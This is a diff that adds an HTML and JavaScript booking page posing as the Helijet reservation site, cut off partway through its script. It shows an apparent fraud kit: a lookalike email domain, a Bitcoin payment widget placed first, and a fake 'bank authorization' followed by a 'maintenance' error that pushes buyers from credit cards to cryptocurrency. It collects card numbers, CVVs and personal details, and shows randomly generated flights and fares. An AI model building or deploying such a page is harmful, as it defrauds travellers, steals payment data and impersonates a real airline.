+  transition: var(--transition);
+  width: 100%;
+  box-shadow: 0 4px 12px rgba(10, 37, 64, 0.2);
+}
+
+.res-close-btn:hover {
+  background: linear-gradient(135deg, var(--primary-light) 0%, var(--primary-dark) 100%);
+  transform: translateY(-1px);
+}
+
+.cc-close-btn {
+  background: linear-gradient(135deg, var(--accent) 0%, #e53e3e 100%);
+  box-shadow: 0 4px 12px rgba(229, 62, 62, 0.2);
+}
+
+.cc-close-btn:hover {
+  background: linear-gradient(135deg, #e53e3e 0%, #b91c1c 100%);
+  transform: translateY(-1px);
+}
+
+.input-error {
+  border: 2px solid var(--accent) !important;
+  background-color: #fffafb !important;
+  box-shadow: 0 0 0 3px rgba(229, 62, 62, 0.12) !important;
+}
+</style>
+</head>
+<body>
+
+<header id="booking-header">
+  <a class="logo" href="../index.html">Helijet</a>
+  <span class="phone">Reservations: 1.800.665.4354</span>
+</header>
+
+<button id="close-btn" onclick="window.location='../index.html'" title="Close">✕</button>
+
+<div class="booking-wrap">
+
+  <!-- ══ STEP 1: FLIGHT SELECTION ══ -->
+  <div class="step-block">
+    <div class="step-header">
+      <div class="step-num">1</div>
+      <span class="step-title" id="step1-route">Loading Route...</span>
+    </div>
+    <div class="step-body">
+      <div class="date-tabs" id="date-tabs"></div>
+      <div id="flights-container">
+        <div class="ft-wrap">
+          <div class="ft-head">
+            <span>Flight</span><span>Date</span><span>Departure</span><span>Arrival</span><span>Tier</span><span style="text-align:right">Grand Total</span>
+          </div>
+          <div class="ft-body" id="ft-body"></div>
+        </div>
+      </div>
+      <div class="action-row">
+        <button class="btn-outline">Reverse Route</button>
+        <button class="btn-ghost">Modify Search</button>
+        <button class="btn-nav" id="btn-prev-date">« Prev</button>
+        <button class="btn-nav" id="btn-next-date">Next »</button>
+        <button class="btn-sort">Sort by Price</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ STEP 2: PASSENGERS ══ -->
+  <div class="step-block">
+    <div class="step-header">
+      <div class="step-num">2</div>
+      <span class="step-title">Passengers</span>
+    </div>
+    <div class="step-body">
+      <div class="login-bar">
+        <span>Have an existing Helijet login?</span>
+        <button class="login-now-btn" onclick="window.location='../account/index.html'">Login Now</button>
+        <a href="../account/index.html?tab=create" class="create-link">Create an Account</a>
+      </div>
+      <p class="pax-hint">Please sign in or enter your passenger details.</p>
+
+      <div style="margin-bottom:16px">
+        <span class="pax-num">1</span>
+        <div class="form-grid" style="margin-top:10px">
+          <input type="text" placeholder="First Name" class="req" id="pax-firstname"/>
+          <input type="text" placeholder="Last Name" class="req" id="pax-lastname"/>
+          <select class="req" id="pax-gender"><option>Male</option><option>Female</option><option>Other</option></select>
+          <input type="text" placeholder="Heli #"/>
+          <input type="text" placeholder="Comments"/>
+        </div>
+        <div class="form-grid2">
+          <input type="email" placeholder="email@company.com" class="req" id="pax-email"/>
+          <input type="date" placeholder="Date of Birth" class="req" id="pax-dob"/>
+          <input type="tel" placeholder="Phone (xxx-xxx-xxxx)" class="req" id="pax-phone"/>
+        </div>
+      </div>
+
+      <div class="form-full">
+        <div class="form-col">
+          <div class="row"><label>Name</label><select class="req" id="pax-contact-name"><option></option></select></div>
+          <div class="row"><label>Company</label><input type="text"/></div>
+          <div class="row"><label>Address</label>
+            <div>
+              <input type="text" placeholder="Address" class="req" id="pax-address" style="margin-bottom:6px"/>
+              <input type="text" placeholder="City" class="req" id="pax-city" style="margin-bottom:6px"/>
+              <div style="display:flex;gap:8px;margin-bottom:6px">
+                <input type="text" placeholder="State" style="flex:1"/>
+                <input type="text" placeholder="Zip" style="flex:1"/>
+              </div>
+              <select><option>Canada</option><option>USA</option><option>Other</option></select>
+            </div>
+          </div>
+        </div>
+        <div class="form-col">
+          <div class="row"><label>Business</label><input type="tel" placeholder="xxx-xxx-xxxx" class="req" id="pax-bus-phone"/></div>
+          <div class="row"><label>Home</label><input type="tel" placeholder="xxx-xxx-xxxx" class="req" id="pax-home-phone"/></div>
+          <div class="row"><label>Mobile</label><input type="tel" placeholder="xxx-xxx-xxxx" class="req" id="pax-mob-phone"/></div>
+          <div class="row"><label>Fax</label><input type="tel" placeholder="xxx-xxx-xxxx"/></div>
+          <div class="row"><label>Email</label><input type="email" placeholder="email@company.com" class="req" id="pax-billing-email"/></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ STEP 3: SUMMARY ══ -->
+  <div class="step-block">
+    <div class="step-header">
+      <div class="step-num">3</div>
+      <span class="step-title">Summary</span>
+    </div>
+    <div class="step-body">
+      <div class="summary-right">
+        <div class="sum-row"><span>Subtotal</span><span id="sum-subtotal">CAD 0.00</span></div>
+        <div class="sum-row"><span>Taxes</span><span id="sum-tax">CAD 0.00</span></div>
+        <div class="coupon-row">
+          <input type="text" placeholder="Coupon"/>
+          <button>🔍</button>
+        </div>
+        <div class="sum-row total"><span>Grand Total</span><span id="sum-grand">CAD 0.00</span></div>
+        <div class="ref-row"><input type="text" placeholder="Reference Number (Optional)"/></div>
+        <div class="agent-row"><input type="checkbox" id="agent-link"/><label for="agent-link">Link to travel agent</label></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ STEP 4: PAYMENT ══ -->
+  <div class="step-block">
+    <div class="step-header">
+      <div class="step-num">4</div>
+      <span class="step-title">Payment</span>
+    </div>
+    <div class="step-body">
+      <p style="font-size:13px;color:#555;margin-bottom:16px">Please note that we do not accept Visa Debit for online bookings.</p>
+      <div class="payment-wrap">
+
+        <!-- Left: payment type radios -->
+        <div class="payment-options">
+
+          <!-- 1st: Cryptocurrency -->
+          <label style="font-weight:700;color:#2152b2">
+            <input type="radio" name="pay" value="crypto" id="pay-crypto"/>
+            <span style="display:flex;align-items:center;gap:6px">
+              <span style="font-size:16px">₿</span> Cryptocurrency
+            </span>
+          </label>
+
+          <!-- Crypto sub-options (BTC / USDT) -->
+          <div id="crypto-subopts">
+            <p>Select Cryptocurrency</p>
+            <button type="button" class="crypto-coin-btn" id="btn-btc">
+              <span class="coin-icon coin-btc">₿</span>
+              <span class="coin-label">Bitcoin<small>BTC</small></span>
+            </button>
+            <button type="button" class="crypto-coin-btn usdt" id="btn-usdt">
+              <span class="coin-icon coin-usdt" style="color:#fff;font-weight:700">₮</span>
+              <span class="coin-label">Tether<small>USDT</small></span>
+            </button>
+            <div class="usdt-note" id="usdt-note">⚠ USDT payments are currently unavailable. Please select BTC or another payment method.</div>
+          </div>
+
+          <!-- Divider -->
+          <div style="border-top:1px solid #dde2ea;margin:10px 0 8px;"></div>
+          <p style="font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#888;margin-bottom:6px">Credit Card</p>
+
+          <!-- 2nd: Card options -->
+          <label><input type="radio" name="pay" value="amex" id="pay-amex"/> American Express</label>
+          <label><input type="radio" name="pay" value="account" id="pay-account"/> On Account</label>
+          <label><input type="radio" name="pay" value="qt" id="pay-qt"/> Quick Ticket (Prepaid)</label>
+        </div>
+
+        <!-- Right: card form (shown when card option selected) -->
+        <div class="card-form" id="card-form-wrap">
+          <label>Number</label>
+          <input type="text" id="card-number-input" placeholder="Card Number" autocomplete="off"/>
+          <label>Expiration</label>
+          <div class="exp-row">
+            <select id="card-expiry-month"><option>Month</option><option>01</option><option>02</option><option>03</option><option>04</option><option>05</option><option>06</option><option>07</option><option>08</option><option>09</option><option>10</option><option>11</option><option>12</option></select>
+            <select id="card-expiry-year"><option>Year</option><option>2025</option><option>2026</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option></select>
+          </div>
+          <label>CVV</label>
+          <input type="text" id="card-cvv-input" placeholder="CVV" style="max-width:80px"/>
+          <a href="#" class="tc-link">Terms &amp; Conditions</a>
+          <div class="card-logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="Amex" style="height:28px"/>
+          </div>
+          <p class="ssl-note">Booking services and 2048-bit encryption provided by Blue Sky Booking.</p>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ NOWPayments BTC modal ══ -->
+  <div id="np-overlay" role="dialog" aria-modal="true" aria-label="Bitcoin Payment">
+    <div id="np-modal">
+      <button id="np-close" aria-label="Close payment widget" title="Close">✕</button>
+      <iframe
+        src="https://nowpayments.io/embeds/payment-widget?iid=4711591538"
+        width="410" height="696"
+        frameborder="0" scrolling="no"
+        style="overflow-y:hidden;display:block">
+        Can't load widget
+      </iframe>
+    </div>
+  </div>
+
+  <!-- ══ Reservation confirmation modal ══ -->
+  <div id="res-overlay" role="dialog" aria-modal="true" aria-label="Reservation Confirmed">
+    <div id="res-modal">
+
+      <!-- Phase 1: Spinner -->
+      <div id="res-spinner-phase">
+        <div class="res-spinner"></div>
+        <div class="res-spinner-text">Processing your reservation&hellip;</div>
+        <div class="res-spinner-sub">Please do not close this window</div>
+      </div>
+
+      <!-- Phase 2: Confirmation -->
+      <div id="res-confirm-phase">
+        <div class="res-icon-wrap">
+          <svg viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="3" y="9" width="32" height="22" rx="3" fill="white" fill-opacity="0.2" stroke="white" stroke-width="2"/>
+            <polyline points="3,9 19,22 35,9" stroke="white" stroke-width="2" fill="none"/>
+            <polyline points="11,19 17,25 27,13" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <div class="res-id-label">Reservation ID</div>
+        <div class="res-id" id="res-id-display">&mdash;</div>
+        <div class="res-headline">You're all set!</div>
+        <div class="res-sub">Our team will confirm your reservation by email within 24 hours.<br>Please save your Reservation ID for reference.</div>
+        <button class="res-close-btn" id="res-close-btn">Close</button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ══ Credit Card Maintenance Modal ══ -->
+  <div id="cc-maintenance-overlay" role="dialog" aria-modal="true" aria-label="Payment System Maintenance">
+    <div id="cc-maintenance-modal">
+      
+      <!-- Phase 1: Loading/Auth Spinner -->
+      <div id="cc-loading-phase">
+        <div class="cc-spinner"></div>
+        <div class="cc-spinner-text">Authorizing payment with bank...</div>
+        <div class="cc-spinner-sub">Please do not refresh or close this page</div>
+      </div>
+
+      <!-- Phase 2: Maintenance Notification -->
+      <div id="cc-error-phase" style="display: none;">
+        <div class="cc-error-icon-wrap">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 9V14M12 17.01H12.01M12 21C16.9706 21 21 16.9706 21 12C21 7.02944 16.9706 3 12 3C7.02944 3 3 7.02944 3 12C3 16.9706 7.02944 21 12 21Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <div class="cc-error-title">Credit Card Processing Unavailable</div>
+        <div class="cc-error-msg">
+          Our credit card gateway is currently undergoing scheduled system maintenance.
+          <br><br>
+          Please select an alternative payment method (such as <strong>Cryptocurrency</strong>, <strong>On Account</strong>, or <strong>Quick Ticket</strong>) or call Helijet Reservations at <strong>1.800.665.4354</strong> to secure your flight.
+        </div>
+        <button class="cc-close-btn" id="cc-maintenance-close-btn">Return to Payment</button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ══ STEP 5: CONFIRMATION ══ -->
+  <div class="step-block">
+    <div class="step-header">
+      <div class="step-num">5</div>
+      <span class="step-title">Confirmation</span>
+    </div>
+    <div class="step-body">
+      <div class="conf-grid">
+        <div>
+          <div class="conf-options">
+            <label><input type="radio" name="conf" value="email" checked/> Email</label>
+          </div>
+          <div style="margin-top:10px;display:flex;flex-direction:column;gap:8px">
+            <input type="email" placeholder="email@company.com" class="req" id="pax-conf-email"/>
+            <input type="email" placeholder="email@company.com (optional)"/>
+          </div>
+        </div>
+        <div class="safe-sender-note">
+          <span class="icon">⚠</span>
+          <span>To ensure you receive confirmation emails, please add <a href="mailto:passengerservices@helijet.it.com">passengerservices@helijet.it.com</a> to your safe senders list.</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Submit -->
+  <div class="submit-bar">
+    <a href="../index.html" class="cancel-link">Cancel</a>
+    <button class="submit-btn" onclick="handleBooking()">Complete Booking</button>
+  </div>
+
+</div><!-- /booking-wrap -->
+
+<script>
+// ── URL params → route label ──
+(function(){
+  var p = new URLSearchParams(window.location.search);
+  window.bookingParams = {
+    from: p.get('from') || '',
+    to: p.get('to') || '',
+    day: p.get('day') || '',
+    pax: p.get('pax') || ''
+  };
+})();
+
+// ── Seeded PRNG (mulberry32) — stable randomness per date ──
+function makePRNG(seed) {
+  var s = seed >>> 0;
+  return function() {
+    s += 0x6D2B79F5;
+    var t = Math.imul(s ^ s >>> 15, 1 | s);
+    t ^= t + Math.imul(t ^ t >>> 7, 61 | t);
+    return ((t ^ t >>> 14) >>> 0) / 4294967296;
+  };
+}
+
+// Turn a date key string into a numeric seed
+function strSeed(str) {
+  var h = 0x811c9dc5;
+  for (var i = 0; i < str.length; i++) {
+    h ^= str.charCodeAt(i);
+    h = Math.imul(h, 0x01000193);
+  }
+  return h >>> 0;
+}
+
+// Availability pool
+var AV = {
+  few:      {label:'3 or less',      cls:'few'},
+  ok:       {label:'Available',      cls:'ok'},
+  sold:     {label:'Sold out!',      cls:'sold'},
+  waitlist: {label:'Call to Waitlist', cls:'waitlist'}
+};
+var AV_LIST = [AV.few, AV.ok, AV.sold, AV.waitlist];
+// Weighted: 30% few, 40% ok, 20% sold, 10% waitlist
+var AV_WEIGHTS = [0.30, 0.70, 0.90, 1.00];
+
+function pickAV(rng) {
+  var r = rng();
+  for (var i = 0; i < AV_WEIGHTS.length; i++) {
+    if (r < AV_WEIGHTS[i]) return AV_LIST[i];
+  }
+  return AV.ok;
+}
+
+// All possible time slots pool (flight#, dep, arr)
+var ALL_SLOTS = [
+  [701,'08:05','08:40'],[703,'08:30','09:05'],[705,'09:00','09:35'],
+  [707,'09:55','10:30'],[709,'11:00','11:35'],[711,'12:30','13:05'],
+  [713,'13:30','14:05'],[715,'14:30','15:05'],[717,'15:30','16:05'],
+  [719,'16:30','17:05'],[721,'17:30','18:05'],[723,'18:30','19:05'],
+  [725,'19:30','20:05'],[727,'20:30','21:05']
+];
+
+var TIER_SETS = [
+  ['FLASH SALE','ULTRA-SAVER','SUPER SALE','SALES','FULL FARE'],
+  ['ULTRA-SAVER','SUPER SALE','SALES','FULL FARE'],
+  ['FLASH SALE','ULTRA-SAVER','SUPER SALE','SALES'],
+  ['ULTRA-SAVER','SUPER SALE','SALES'],
+  ['FLASH SALE','ULTRA-SAVER','SUPER SALE','SALES','FULL FARE'],
+  ['ULTRA-SAVER','SALES','FULL FARE']
+];
+
+// Price gaps per tier index (FLASH=0, ULTRA=1, SUPER=2, SALES=3, FULL=4)
+var TIER_PRICE_OFFSET = {
+  'FLASH SALE':   0,
+  'ULTRA-SAVER':  100,
+  'SUPER SALE':   250,
+  'SALES':        400,
+  'FULL FARE':    600
+};
+
+// ── Route pool & randomize logic ──
+var DEPARTURES = [
+  "Port of St. John's",
+  "Port aux Basques",
+  "Corner Brook",
+  "Conception Bay South",
+  "Lewisporte",
+  "Clarenville",
+  "Holyrood",
+  "St. Anthony",
+  "Twillingate",
+  "Battle Harbour",
+  "Argentia",
+  "Bay Roberts",
+  "Fortune",
+  "Grand Bank",
+  "Harbour Grace",
+  "Bonavista",
+  "Placentia",
+  "Marystown",
+  "Burgeo",
+  "Trinity"
+];
+
+var ARRIVALS = [
+  "Port of Quebec (Quebec)",
+  "Port of Montreal (Quebec)",
+  "Port of Vancouver (British Columbia)",
+  "Port of Halifax (Nova Scotia)",
+  "Sydney Harbour (Nova Scotia)",
+  "Port of Prince Rupert (British Columbia)",
+  "Port of Saint John (New Brunswick)",
+  "Lévis Ferry Terminal (Quebec)",
+  "Sept-Îles (Quebec)",
+  "Baie-Comeau (Quebec)",
+  "Port aux Basques (Newfoundland)",
+  "Port of Victoria (British Columbia)"
+];
+
+function pickRoute(rng) {
+  var dep = DEPARTURES[Math.floor(rng() * DEPARTURES.length)];
+  var arr = ARRIVALS[Math.floor(rng() * ARRIVALS.length)];
+  while (arr === dep || arr.replace(/\s*\(.*\)/, '') === dep.replace(/\s*\(.*\)/, '')) {
+    arr = ARRIVALS[Math.floor(rng() * ARRIVALS.length)];
+  }
+  return [dep, arr];
+}
+
+function getRouteForDate(rng, dateKey, si) {
+  var searchedFrom = window.bookingParams.from || "Port aux Basques";
+  var searchedTo = window.bookingParams.to || "Port of Montreal (Quebec)";
+
+  if (searchedFrom === "Port aux Basques" && searchedTo === "Port of Montreal (Quebec)") {
+    var isSpecialDate = (dateKey.indexOf('5/20') !== -1 || dateKey.indexOf('5/24') !== -1 || dateKey.indexOf('5/26') !== -1);
+    if (isSpecialDate && si === 0) {
+      return ["Port aux Basques", "Port of Montreal (Quebec)"];
+    } else {
+      var r = pickRoute(rng);
+      while (r[0] === "Port aux Basques" && r[1] === "Port of Montreal (Quebec)") {
+        r = pickRoute(rng);
+      }
+      return r;
+    }
+  } else {
+    if (si === 0) {
+      return [searchedFrom, searchedTo];
+    } else {
+      var r = pickRoute(rng);
+      while (r[0] === searchedFrom && r[1] === searchedTo) {
+        r = pickRoute(rng);
+      }
+      return r;
+    }
+  }
+}
+
+function buildRandomSchedule(dateKey, dateLabel) {
+  var rng    = makePRNG(strSeed(dateKey));
+  // Pick 3–9 flights
+  var count  = 3 + Math.floor(rng() * 7);          // 3..9
+  var base   = 3000 + Math.floor(rng() * 200);     // 3000..3199
+
+  // Shuffle ALL_SLOTS and take first `count`
+  var pool   = ALL_SLOTS.slice();
+  for (var i = pool.length - 1; i > 0; i--) {
+    var j = Math.floor(rng() * (i + 1));
+    var tmp = pool[i]; pool[i] = pool[j]; pool[j] = tmp;
+  }
+  pool = pool.slice(0, count).sort(function(a,b){ return a[0]-b[0]; });
+
+  var flights = [];
+  pool.forEach(function(slot, si) {
+    var tierSet = TIER_SETS[Math.floor(rng() * TIER_SETS.length)];
+    var slotBase = base + si * Math.floor(rng() * 15 + 5);   // each flight slightly pricier
+
+    // Determine availability cascade: once sold/waitlist, remaining are too
+    var hitWall = false;
+    var tiers = tierSet.map(function(name) {
+      var av;
+      if (hitWall) {
+        av = rng() < 0.6 ? AV.sold : AV.waitlist;
+      } else {
+        av = pickAV(rng);
+        if (av === AV.sold || av === AV.waitlist) hitWall = true;
+      }
+      var price = 'CAD ' + (slotBase + TIER_PRICE_OFFSET[name]).toLocaleString();
+      return { name: name, avail: av, price: (av===AV.sold||av===AV.waitlist) ? '' : price };
+    });
+
+    var route = getRouteForDate(rng, dateKey, si);
+    flights.push({
+      num:  slot[0],
+      date: dateLabel,
+      dep:  slot[1] + ' ' + route[0],
+      arr:  slot[2] + ' ' + route[1],
+      tiers: tiers
+    });
+  });
+  return flights;
+}
+
+// ── 30-day date range (May 14 – June 12, 2026) ──
+var DAY_NAMES  = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+var MON_NAMES  = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+var DATE_START = new Date(2026, 4, 14); // May 14
+var DATE_COUNT = 30;
+
+var ALL_DATES = (function(){
+  var arr = [], d = new Date(DATE_START);
+  for(var i = 0; i < DATE_COUNT; i++){
+    var key   = DAY_NAMES[d.getDay()] + ', ' + (d.getMonth()+1) + '/' + d.getDate();
+    var label = MON_NAMES[d.getMonth()] + ' ' + d.getDate();
+    arr.push({ key: key, label: label, dateObj: new Date(d) });
+    d.setDate(d.getDate() + 1);
+  }
+  return arr;
+})();
+
+var DATE_LABELS = {};
+ALL_DATES.forEach(function(d){ DATE_LABELS[d.key] = d.label; });
+
+// Date category boundaries
+var LIMITED_START  = new Date(2026, 4, 19); // May 19 (inclusive)
+var LIMITED_END    = new Date(2026, 4, 27); // May 27 (inclusive)
+var WAITLIST_START = new Date(2026, 4, 28); // May 28+
+
+function dateCategory(dateObj){
+  var d = new Date(dateObj.getFullYear(), dateObj.getMonth(), dateObj.getDate());
+  if(d < LIMITED_START)  return 'random';
+  if(d <= LIMITED_END)   return 'limited';
+  return 'waitlist';
+}
+
+// Build a limited schedule (May 19–27): 2–3 flights, CAD 3,000, 3-or-less availability
+function buildLimitedSchedule(dateKey, dateLabel){
+  var rng  = makePRNG(strSeed(dateKey));
+  var count= 2 + Math.floor(rng() * 2); // 2 or 3
+  var pool = ALL_SLOTS.slice();
+  for(var i = pool.length-1; i > 0; i--){
+    var j = Math.floor(rng()*(i+1));
+    var tmp = pool[i]; pool[i] = pool[j]; pool[j] = tmp;
+  }
+  pool = pool.slice(0, count).sort(function(a,b){ return a[0]-b[0]; });
+  return pool.map(function(slot, si){
+    var route = getRouteForDate(rng, dateKey, si);
+    return {
+      num:  slot[0],
+      date: dateLabel,
+      dep:  slot[1] + ' ' + route[0],
+      arr:  slot[2] + ' ' + route[1],
+      tiers:[
+        { name:'ULTRA-SAVER', avail:AV.few,     price:'CAD 3,000' },
+        { name:'FULL FARE',   avail:AV.waitlist, price:'' }
+      ]
+    };
+  });
+}
+
+// Build a waitlist-only schedule (May 28+): 3 flights, all tiers waitlist
+function buildWaitlistSchedule(dateKey, dateLabel){
+  var rng  = makePRNG(strSeed(dateKey));
+  var pool = ALL_SLOTS.slice(1, 5); // slots 703–715 area
+  return pool.map(function(slot, si){
+    var route = getRouteForDate(rng, dateKey, si);
+    return {
+      num:  slot[0],
+      date: dateLabel,
+      dep:  slot[1] + ' ' + route[0],
+      arr:  slot[2] + ' ' + route[1],
+      tiers:[
+        { name:'ECONOMY',  avail:AV.waitlist, price:'' },
+        { name:'FULL FARE',avail:AV.waitlist, price:'' }
+      ]
+    };
+  });
+}
+
+// Build SCHEDULE lazily (cached per key)
+// Build SCHEDULE lazily (cached per key)
+var SCHEDULE_CACHE = {};
+function getSchedule(dateKey){
+  if(!SCHEDULE_CACHE[dateKey]){
+    var info = null;
+    for(var i=0;i<ALL_DATES.length;i++){
+      if(ALL_DATES[i].key === dateKey){ info = ALL_DATES[i]; break; }
+    }
+    var label   = info ? info.label   : dateKey;
+    SCHEDULE_CACHE[dateKey] = buildRandomSchedule(dateKey, label);
+  }
+  return SCHEDULE_CACHE[dateKey];
+}
+
+function getMinPriceForDate(dateKey) {
+  var searchedFrom = window.bookingParams.from || "Port aux Basques";
+  var searchedTo = window.bookingParams.to || "Port of Montreal (Quebec)";
+
+  var flights = getSchedule(dateKey);
+  var matching = flights.filter(function(f) {
+    return f.dep.indexOf(searchedFrom) !== -1 && f.arr.indexOf(searchedTo) !== -1;
+  });
+  if (matching.length === 0) return null;
+  
+  var minPrice = Infinity;
+  matching.forEach(function(f) {
+    f.tiers.forEach(function(t) {
+      if (t.avail !== AV.sold && t.avail !== AV.waitlist && t.price) {
+        var num = parseInt(t.price.replace(/[^\d]/g, ''), 10);
+        if (!isNaN(num) && num < minPrice) {
+          minPrice = num;
+        }
+      }
+    });
+  });
+  return minPrice === Infinity ? null : minPrice;
+}
+
+// ── Render flights ──
+function renderFlights(dateKey) {
+  var searchedFrom = window.bookingParams.from || "Port aux Basques";
+  var searchedTo = window.bookingParams.to || "Port of Montreal (Quebec)";
+
+  var flights = getSchedule(dateKey);
+  var matchingFlights = flights.filter(function(f) {
+    return f.dep.indexOf(searchedFrom) !== -1 && f.arr.indexOf(searchedTo) !== -1;
+  });
+
+  var body = document.getElementById('ft-body');
+  if (!matchingFlights || !matchingFlights.length) {
+    body.innerHTML = '<div class="ft-no-flights">There are no schedules for the selected search.</div>';
+    return;
+  }
+  var html = '';
+  matchingFlights.forEach(function(f, fi) {
+    var groupClass = (fi % 2 === 0) ? '' : ' odd-group';
+    var firstRow = true;
+    f.tiers.forEach(function(t, ti) {
+      var isSold     = t.avail === AV.sold;
+      var isWaitlist = t.avail === AV.waitlist;
+      var availHtml  = isSold     ? '<span class="avail sold">Sold out!</span>'
+                     : isWaitlist ? '<span class="avail waitlist">Call to Waitlist</span>'
+                     : t.avail.cls === 'few' ? '<span class="avail few">3 or less</span>'
+                     : '<span class="avail ok">Available</span>';
+      var priceHtml  = (isSold || isWaitlist) ? '' : '<span class="ft-price">' + t.price + '</span>';
+      var radioId    = 'tier-' + f.num + '-' + ti;
+      html += '<div class="ft-tier-row' + groupClass + '">';
+      // Flight num + date only on first tier row
+      html += '<span class="ft-flight-num">' + (firstRow ? f.num : '') + '</span>';
+      html += '<span class="ft-date-cell">'  + (firstRow ? f.date : '') + '</span>';
+      html += '<span class="ft-dep">'        + (firstRow ? '<strong>' + f.dep.split(' ')[0] + '</strong>' + f.dep.slice(f.dep.indexOf(' ')) : '') + '</span>';
+      html += '<span class="ft-arr">'        + (firstRow ? '<strong>' + f.arr.split(' ')[0] + '</strong>' + f.arr.slice(f.arr.indexOf(' ')) : '') + '</span>';
+      html += '<span class="ft-tier-cell"><input type="radio" name="flight-tier" id="' + radioId + '" ' + (isSold||isWaitlist?'disabled':'') + '/><label for="' + radioId + '"><span class="tier-name">' + t.name + '</span> ' + availHtml + '</label></span>';
+      html += '<span style="text-align:right">' + priceHtml + '</span>';
+      html += '</div>';
+      firstRow = false;
+    });
+    // group separator
+    html += '<div style="border-top:1px solid #dde3ef"></div>';
+  });
+  body.innerHTML = html;
+}
+
+// ── Build date tabs dynamically ──
+(function(){
+  var today = new Date();
+  today = new Date(today.getFullYear(), today.getMonth(), today.getDate());
+  var container = document.getElementById('date-tabs');
+  var searchedFrom = window.bookingParams.from || "Port aux Basques";
+  var searchedTo = window.bookingParams.to || "Port of Montreal (Quebec)";
+
+  ALL_DATES.forEach(function(info){
+    var div = document.createElement('div');
+    var isPast = info.dateObj < today;
+    div.className = 'date-tab' + (isPast ? ' past' : '');
+    div.dataset.date = info.key;
+    if(isPast){
+      div.innerHTML = info.key + '<small>Past</small>';
+    } else {
+      var minPrice = getMinPriceForDate(info.key);
+      if (minPrice !== null) {
+        div.innerHTML = info.key + '<small>from CAD ' + minPrice.toLocaleString() + '</small>';
+      } else {
+        var flights = getSchedule(info.key);
+        var matching = flights.filter(function(f) {
+          return f.dep.indexOf(searchedFrom) !== -1 && f.arr.indexOf(searchedTo) !== -1;
+        });
+        if (matching.length > 0) {
+          div.innerHTML = info.key + '<small>Waitlist</small>';
+        } else {
+          div.innerHTML = info.key + '<small>No Flights</small>';
+        }
+      }
+    }
+    container.appendChild(div);
+  });
+})();
+
+// ── Date tab switching ──
+// Default to today or the first date containing matching flights
+var activeTabIndex = (function(){
+  if (window.bookingParams && window.bookingParams.day) {
+    var parts = window.bookingParams.day.split('-');
+    if (parts.length === 3) {
+      var m = parseInt(parts[1], 10);
+      var d = parseInt(parts[2], 10);
+      for(var i=0;i<ALL_DATES.length;i++){
+        if(ALL_DATES[i].dateObj.getMonth() + 1 === m && ALL_DATES[i].dateObj.getDate() === d) return i;
+      }
+    }
+  }
+  
+  var searchedFrom = window.bookingParams.from || "Port aux Basques";
+  var searchedTo = window.bookingParams.to || "Port of Montreal (Quebec)";
+  
+  // Special default routing for Port aux Basques -> Port of Montreal (Quebec) to May 20
+  if (searchedFrom === "Port aux Basques" && searchedTo === "Port of Montreal (Quebec)") {
+    for(var i=0;i<ALL_DATES.length;i++){
+      if(ALL_DATES[i].dateObj.getMonth() + 1 === 5 && ALL_DATES[i].dateObj.getDate() === 20) return i;
+    }
+  }
+
+  // Otherwise, find the first future/today date that has matching flights
+  var today = new Date();
+  today = new Date(today.getFullYear(), today.getMonth(), today.getDate());
+  for(var i=0;i<ALL_DATES.length;i++){
+    if (ALL_DATES[i].dateObj >= today) {
+      var flights = getSchedule(ALL_DATES[i].key);
+      var matching = flights.filter(function(f) {
+        return f.dep.indexOf(searchedFrom) !== -1 && f.arr.indexOf(searchedTo) !== -1;
+      });
+      if (matching.length > 0) return i;
+    }
+  }
+
+  var todayKey = 'Mon, 5/18';
+  for(var i=0;i<ALL_DATES.length;i++){
+    if(ALL_DATES[i].key === todayKey) return i;
+  }
+  return 0;
+})();
+
+function setActiveTab(index){
+  var tabs = document.querySelectorAll('.date-tab');
+  if(index < 0 || index >= tabs.length) return;
+  activeTabIndex = index;
+  tabs.forEach(function(t){ t.classList.remove('active'); });
+  tabs[index].classList.add('active');
+  // Scroll the active tab into view
+  tabs[index].scrollIntoView({ behavior:'smooth', block:'nearest', inline:'center' });
+  var key = tabs[index].dataset.date;
+  
+  // Update the route label based on active tab dynamically
+  var label = DATE_LABELS[key] || key;
+  var fromParam = window.bookingParams.from || "Port aux Basques";
+  var toParam = window.bookingParams.to || "Port of Montreal (Quebec)";
+  document.getElementById('step1-route').textContent = label + '   ' + fromParam + ' to ' + toParam;
+
+  // Reset summary when date changes
+  updateSummary(null);
+  renderFlights(key);
+}
+
+document.getElementById('date-tabs').addEventListener('click', function(e){
+  var tab = e.target.closest('.date-tab');
+  if(!tab) return;
+  var tabs = Array.prototype.slice.call(document.querySelectorAll('.date-tab'));
+  var idx  = tabs.indexOf(tab);
+  if(idx >= 0) setActiveTab(idx);
+});
+
+document.getElementById('btn-prev-date').addEventListener('click', function(){
+  // Skip past tabs when going backwards
+  var tabs = document.querySelectorAll('.date-tab');
+  var idx = activeTabIndex - 1;
+  while(idx >= 0 && tabs[idx].classList.contains('past')) idx--;
+  setActiveTab(idx);
+});
+document.getElementById('btn-next-date').addEventListener('click', function(){
+  var tabs = document.querySelectorAll('.date-tab');
+  var idx = activeTabIndex + 1;
+  while(idx < tabs.length && tabs[idx].classList.contains('past')) idx++;
+  setActiveTab(idx);
+});
+
+// Initial render
+setActiveTab(activeTabIndex);
+
+// ── Payment type switching ──
+var cryptoOpts  = document.getElementById('crypto-subopts');
+var cardFormWrap= document.getElementById('card-form-wrap');
+var usdtNote    = document.getElementById('usdt-note');
+var npOverlay   = document.getElementById('np-overlay');
+
+document.querySelectorAll('input[name="pay"]').forEach(function(radio){
